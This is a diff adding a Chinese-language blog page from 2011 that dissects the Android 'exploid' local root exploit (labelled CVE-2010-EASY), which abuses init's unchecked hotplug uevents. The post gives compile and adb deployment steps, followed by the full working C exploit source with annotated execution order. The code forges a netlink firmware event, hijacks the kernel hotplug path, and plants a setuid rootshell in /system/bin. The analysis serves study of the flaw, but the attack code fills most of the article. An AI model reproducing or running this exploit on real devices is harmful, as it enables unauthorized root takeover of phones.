@@ -1,0 +1,367 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>
+    
+  Android root源代码剖析(基于CVE-2010-EASY) - potatoooooo
+  
+
+  </title>
+  <meta name="author" content="">
+  <meta name="description" content="">
+
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <link href="asset/css/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="atom.xml" rel="alternate" title="potatoooooo" type="application/atom+xml">
+  <script src="asset/js/modernizr-2.0.js"></script>
+  <script src="asset/js/jquery.min.js"></script>
+  <script src="asset/highlightjs/highlight.pack.js"></script>
+  <link href="asset/highlightjs/styles/solarized_light.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script>hljs.initHighlightingOnLoad();</script>
+
+  <style type="text/css">
+  .cat-children-p{ padding: 6px 0px;}
+  .hljs{background: none;}
+  </style>
+  <script type="text/javascript">
+  var isAddSildbar = true;
+  </script>
+  <script src="asset/js/octopress.js" type="text/javascript"></script>
+</head>
+<script type="text/javascript">
+//链接新开窗口
+function addBlankTargetForLinks () {
+  $('a[href^="http"]').each(function(){
+      $(this).attr('target', '_blank');
+  });
+}
+$(document).ready(function(event) {
+  addBlankTargetForLinks();
+});
+</script>
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="index.html">potatoooooo</a></h1>
+  
+    <h2></h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:baozu.us" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="index.html">Home</a></li>
+  <li><a href="archives.html">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content"> 
+<div>
+	<article class="hentry" role="article">
+	<header>
+			  	<h1 class="entry-title">Android root源代码剖析(基于CVE-2010-EASY)</h1>
+				<p class="meta"><time datetime="2011-07-19T00:17:06+08:00" pubdate data-updated="true">2011/7/19</time></p>
+			 </header>
+		  	<div class="entry-content">
+			  	<p>linux系统由udev提供系统设备的管理，如提供热拔插usb设备等等。而Android把udev的工作移交给init进程。而linux中版本号小于1.4.1的udev不会检查是由内核还是用户发送热拔插信息。因此用户可以发送恶意的信息让内核加载定义的恶意程序从而取得root权限。</p>
+
+<ul>
+<li>通过在 <a href="http://www.codesourcery.com/sgpp/lite/arm/portal/release1803">http://www.codesourcery.com/sgpp/lite/arm/portal/release1803</a> 下载编译工具</li>
+<li>通过arm-none-eabi-gcc exploid.c -static -o exploid 编译</li>
+<li>adb push exploid /data/local/tmp 目录中执行即可root</li>
+</ul>
+
+<p>提权之后rootshell是一个权限为04711的属于root的可执行程序，普通用户也可以运行该程序，由于S位置位，当普通用户执行该程序时有效用户ID为root，从而可以运行root用户才能执行的程序和操作，从而提权成功。<br/>
+ <br/>
+源码剖析如下(程序执行的顺序已注释)：</p>
+
+<pre><code>
+#include &lt;stdio.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;linux/netlink.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;signal.h&gt;
+#include &lt;sys/mount.h&gt;
+ 
+int main(int argc, char **argv, char **env)
+{
+        char buf[512], path[512];
+        int ofd;
+        struct sockaddr_nl snl;
+        struct iovec iov = {buf, sizeof(buf)};
+        //(1)初始化要发送的数据，通过NET_LINK机制（参见man 手册，可以与内核实现近似于套接字的通信方式）发送
+        struct msghdr msg = {&amp;snl, sizeof(snl), &amp;iov, 1, NULL, 0, 0};
+        int sock;
+        char *basedir = NULL;
+ 
+ 
+        /* I hope there is no LD_ bug in androids rtld :) */
+        //(11)root后执行rootshell则执行该步，直接创建一个有root权限的shell
+        if (geteuid() == 0 &amp;&amp; getuid() != 0)
+                rootshell(env);
+ 
+    //(2)获取程序的路径，为/data/local/tmp/exploid
+        if (readlink(&quot;/proc/self/exe&quot;, path, sizeof(path)) &lt; 0)
+                die(&quot;[-] readlink&quot;);
+ 
+        if (geteuid() == 0) {
+        //(9)有内核加载热拔插固件时再次执行该应用，此时有效id为为0，有root权限
+                clear_hotplug();
+                /* remount /system rw */
+                
+                //(10)拷贝自己到/system/bin/目录下成为rootshell，并改变sh的文件属性
+                remount_system(&quot;/system&quot;);
+                if (copy(path, &quot;/system/bin/rootshell&quot;) != 0)
+                        chmod(&quot;/system/bin/sh&quot;, 04755);
+                else
+                        chmod(&quot;/system/bin/rootshell&quot;, 04711);
+                for (;;)
+                        sleep(3);
+        }
+ 
+        printf(&quot;[*] Android local root exploid (C) The Android Exploid Crew\n&quot;);
+    //(3)改变工作目录，没有root权限，只可以在少数目录执行
+        basedir = &quot;/sqlite_stmt_journals&quot;;
+        if (chdir(basedir) &lt; 0) {
+                basedir = &quot;/data/local/tmp&quot;;
+                if (chdir(basedir) &lt; 0)
+                        basedir = strdup(getcwd(buf, sizeof(buf)));
+        }
+        printf(&quot;[+] Using basedir=%s, path=%s\n&quot;, basedir, path);
+        printf(&quot;[+] opening NETLINK_KOBJECT_UEVENT socket\n&quot;);
+ 
+        memset(&amp;snl, 0, sizeof(snl));
+        snl.nl_pid = 1;
+        snl.nl_family = AF_NETLINK;
+        
+    //(4)构建一个NETLINK的套接字
+        if ((sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)) &lt; 0)
+                die(&quot;[-] socket&quot;);
+ 
+    //(5)创建要热拔插的文件，其中hotplug文件中存储的为/data/local/tmp/exploid
+        close(creat(&quot;loading&quot;, 0666));
+        if ((ofd = creat(&quot;hotplug&quot;, 0644)) &lt; 0)
+                die(&quot;[-] creat&quot;);
+        if (write(ofd, path , strlen(path)) &lt; 0)
+                die(&quot;[-] write&quot;);
+        close(ofd);
+        
+        //(6)建立一个data文件，为指向系统的hotplug的符号链接
+        symlink(&quot;/proc/sys/kernel/hotplug&quot;, &quot;data&quot;);
+        
+        //(7)构建发送给内核的信息，内容为进行热拔插，固件位置在/data/local/tmp/hotplug
+        snprintf(buf, sizeof(buf), &quot;ACTION=add%cDEVPATH=/..%s%c&quot;
+                 &quot;SUBSYSTEM=firmware%c&quot;
+                 &quot;FIRMWARE=../../..%s/hotplug%c&quot;, 0, basedir, 0, 0, basedir, 0);
+        printf(&quot;[+] sending add message ...\n&quot;);
+        
+        //(8)发送该信息
+        if (sendmsg(sock, &amp;msg, 0) &lt; 0)
+                die(&quot;[-] sendmsg&quot;);
+        close(sock);
+        printf(&quot;[*] Try to invoke hotplug now, clicking at the wireless\n&quot;
+               &quot;[*] settings, plugin USB key etc.\n&quot;
+               &quot;[*] You succeeded if you find /system/bin/rootshell.\n&quot;
+               &quot;[*] GUI might hang/restart meanwhile so be patient.\n&quot;);
+        sleep(3);
+        return 0;
+}
+ 
+void die(const char *msg)
+{
+        perror(msg);
+        exit(errno);
+}
+ 
+ 
+int copy(const char *from, const char *to)
+{
+        int fd1, fd2;
+        char buf[0x1000];
+        int r = 0;
+ 
+        if ((fd1 = open(from, O_RDONLY)) &lt; 0)
+                return -1;
+        if ((fd2 = open(to, O_RDWR|O_CREAT|O_TRUNC, 0600)) &lt; 0) {
+                close(fd1);
+                return -1;
+        }
+ 
+        for (;;) {
+                r = read(fd1, buf, sizeof(buf));
+                if (r &lt;= 0)
+                        break;
+                if (write(fd2, buf, r) != r)
+                        break;
+        }
+ 
+        close(fd1);
+        close(fd2);
+        sync(); sync();
+        return r;
+}
+ 
+ 
+void clear_hotplug()
+{
+        int ofd = open(&quot;/proc/sys/kernel/hotplug&quot;, O_WRONLY|O_TRUNC);
+        write(ofd, &quot;&quot;, 1);
+        close(ofd);
+}
+ 
+ 
+void rootshell(char **env)
+{
+        char *sh[] = {&quot;/system/bin/sh&quot;, 0};
+ 
+        // AID_SHELL
+        if (getuid() != 2000)
+                die(&quot;[-] Permission denied.&quot;);
+ 
+        setuid(0); setgid(0);
+        execve(*sh, sh, env);
+        die(&quot;[-] execve&quot;);
+}
+ 
+ 
+int remount_system(const char *mntpoint)
+{
+        FILE *f = NULL;
+        int found = 0;
+        char buf[1024], *dev = NULL, *fstype = NULL;
+ 
+        if ((f = fopen(&quot;/proc/mounts&quot;, &quot;r&quot;)) == NULL)
+                return -1;
+ 
+        memset(buf, 0, sizeof(buf));
+        for (;!feof(f);) {
+                if (fgets(buf, sizeof(buf), f) == NULL)
+                        break;
+                if (strstr(buf, mntpoint)) {
+                        found = 1;
+                        break;
+                }
+        }
+        fclose(f);
+        if (!found)
+                return -1;
+        if ((dev = strtok(buf, &quot; \t&quot;)) == NULL)
+                return -1;
+        if (strtok(NULL, &quot; \t&quot;) == NULL)
+                return -1;
+        if ((fstype = strtok(NULL, &quot; \t&quot;)) == NULL)
+                return -1;
+        return mount(dev, mntpoint, fstype, MS_REMOUNT, 0);
+}
+
+</code></pre>
+
+			</div>
+
+		
+	  
+		<footer>
+		 <p class="meta">
+
+			
+			<span class="categories">
+			 
+			</span>
+		    </p>
+		    <p class="meta">
+		      
+		 </p>
+	    
+		<div class="sharing">
+			
+		</div>
+
+	    <p class="meta">
+	    
+	        <a class="basic-alignment left" href="14612558333136.html" 
+	        title="Previous Post: 结合init源码剖析Android root提权漏洞（CVE-2010-EASY）">&laquo; 结合init源码剖析Android root提权漏洞（CVE-2010-EASY）</a>
+	    
+	    
+	    </p>
+	  </footer>
+	</article>
+</div>
+ <aside class="sidebar"> 
+
+	<section>
+	  <h1>Categories</h1>
+	  <ul id="recent_posts">
+	  
+	        
+	      </li>
+	   
+	  </ul>
+	</section>
+	<section>
+	  <h1>Recent Posts</h1>
+	  <ul id="recent_posts">
+	  
+	      
+		      <li class="post">
+		        <a href="14612489355704.html"></a>
+		      </li>
+	     
+	  
+	      
+		      <li class="post">
+		        <a href="14612561818311.html">Android提权漏洞CVE-2010-EASY修复</a>
+		      </li>
+	     
+	  
+	      
+		      <li class="post">
+		        <a href="14612558333136.html">结合init源码剖析Android root提权漏洞（CVE-2010-EASY）</a>
+		      </li>
+	     
+	  
+	      
+		      <li class="post">
+		        <a href="14612554261853.html">Android root源代码剖析(基于CVE-2010-EASY)</a>
+		      </li>
+	     
+	   
+	  </ul>
+	</section>
+	
+</aside> </div></div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 -  -
+  <span class="credit">Powered by <a target="_blank" href="http://www.mweb.im">MWeb</a> &nbsp;&nbsp; Theme by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+<script src="asset/chart/all-min.js"></script><script type="text/javascript">$(function(){    var mwebii=0;    var mwebChartEleId = 'mweb-chart-ele-';    $('pre>code').each(function(){        mwebii++;        var eleiid = mwebChartEleId+mwebii;        if($(this).hasClass('language-sequence')){            var ele = $(this).addClass('nohighlight').parent();            $('<div id="'+eleiid+'"><div>').insertAfter(ele);            ele.hide();            var diagram = Diagram.parse($(this).text());            diagram.drawSVG(eleiid,{theme: 'simple'});        }else if($(this).hasClass('language-flow')){            var ele = $(this).addClass('nohighlight').parent();            $('<div id="'+eleiid+'"><div>').insertAfter(ele);            ele.hide();            var diagram = flowchart.parse($(this).text());            diagram.drawSVG(eleiid);        }    });});</script>
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({TeX: { equationNumbers: { autoNumber: "AMS" } }});</script>
+
+</body>
+</html>
